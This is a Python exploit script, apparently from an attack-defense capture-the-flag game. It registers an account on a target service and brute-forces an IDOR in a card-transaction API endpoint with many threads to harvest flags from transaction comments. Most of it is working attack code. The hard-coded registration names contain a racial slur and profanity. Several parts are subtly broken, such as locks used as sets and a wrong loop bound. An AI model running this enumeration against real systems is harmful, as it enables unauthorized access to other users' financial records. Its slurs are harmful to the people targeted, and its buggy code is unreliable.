import requests
import string
import random
import sys
import re
import urllib
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock


'''
Vuln: IDOR — GET /api/v1/card/<card_id>/transaction/<tx_id> returns the
full transaction (with `comment` carrying the flag) without verifying
that the requester owns the card. To hit a transaction the (card_id,
tx_id) pair has to actually match the underlying row (the handler still
filters by card linkage); we brute the space.

'''

used_flags = []

EXECUTION_TIME = 25


DEFAULT_PORT = 8888
protocol = "http://"
ip = "192.168.152.231"
card_id = 0
tx_id = 0

WORKERS = 5

MAX_CARD_ID = 1200
MAX_TX_ID = 600

REQUEST_TIMEOUT = 3

ALREADY_REGISTERED = False
login = ""
password = ""
FIRST_NAME = "suka_blyat"
SECOND_NAME = "nigger_bit_shataet_golovu"


FLAG_PATTERNS  = [
    re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.I),
    re.compile(r"[A-Z0-9]{31}="),
]

def looks_like_flag(s: str) -> bool:
    return any(p.search(s) for p in FLAG_PATTERNS)


def fetch(base, session, card_id, tx_id):
    try:
        r = session.get(f"{base}/api/v1/card/{card_id}/transaction/{tx_id}",
                    
                    timeout=REQUEST_TIMEOUT,
                )
        cookies = requests.utils.cookiejar_from_dict(r.cookies.get_dict() )
        session.cookies.update(cookies)
    except requests.RequestException as e:
        log(f"[!!!] error while fetching: {e}")
        return None
    if r.status_code != 200 or not r.content:
        return None
    body = r.json()
    if isinstance(body, dict) and body:
        return body
    return None

def pairs():
    seen = set()

    for card_id in range(1, MAX_CARD_ID + 1):
        for tx_id in range(1, MAX_CARD_ID + 1):
            pair = (card_id, tx_id)
            if pair in seen:
                continue
            seen.add(pair)
            yield pair
    


def rand_str(n=10, alphabet = string.ascii_letters):
    return "".join(random.choice(alphabet) for i in range(n))

def log(msg):
    print(msg, file=sys.stderr, flush=True)


def registerORlogin(base):
    s = requests.Session()
    s.headers["Connection"] = "keep-alive"
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=WORKERS, pool_maxsize =WORKERS, max_retries=2
    )

    s.mount("http://", adapter)

    if not ALREADY_REGISTERED:
        login = rand_str()
        password = rand_str(17)

        try:
            s.post(f"{base}/api/v1/register",
                json={
                    "login":login,
                    "password":password,
                    "first_name":FIRST_NAME,
                    "second_name":SECOND_NAME,
                },
                timeout=REQUEST_TIMEOUT,
            )
            
        except requests.RequestException as e:
            log(f"[!] register failed, here's an error: {e}")
    
        ALREADY_REGISTERED = True
    else:
        try:
            r = s.post(f"{base}/api/v1/login",
                    json={
                        "login":login,
                        "password":password,
                        },
                    timeout=REQUEST_TIMEOUT,
                )
            cookies = requests.utils.cookiejar_from_dict(r.cookies.get_dict() )
            s.cookies.update(cookies)
        except requests.RequestException as e:
            log(f"[!] login failed, here's an error: {e}")

    return s


def normalize(url: str) -> str:
    if "://" not in url:
        url = "http://" + url
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname or url
    port = parsed_url.port or DEFAULT_PORT

    return f"http://{host}:{port}"


def emit(text, printed):
    for pat in FLAG_PATTERNS:
        for hit in pat.findall(text):
            with printed:
                if hit in printed:
                    continue
                printed.add(hit)
            print(hit, flush=True)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url>", file=sys.stderr)
        sys.exit(1)

    base =normalize(sys.argv[1])
    session = registerORlogin(base)

    found_flags = Lock()
    printed = Lock()
    deadline = time.monotonic() + EXECUTION_TIME

    def work(pair):
        cid, tx_id = pair
        body = fetch(base, session, cid, tx_id)
        if not isinstance(body, dict):
            return 
        comment = body.get("comment")
        if not isinstance(comment, str):
            return 
        with found_flags:
            if comment in found_flags:
                return
            found_flags.add(comment)

        if (looks_like_flag(comment)):
            emit(comment, printed )

    


    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = []
        try:
            for pair in pairs():
                if time.monotonic() > deadline:
                    break
                futures.append(pool.submit(work, pair))
                if len(futures) >= WORKERS * 10:
                    for i in as_completed(futures):
                        if time.monotonic() > deadline:
                            break
                        i.result()
                    futures = [ i for i in futures if not i.done()]
                for i in as_completed(futures):
                    if time.monotonic() > deadline:
                        break
                    i.result()
        finally:
            for f in futures:
                f.cancel()

            
if __name__ == "__main__":
    main()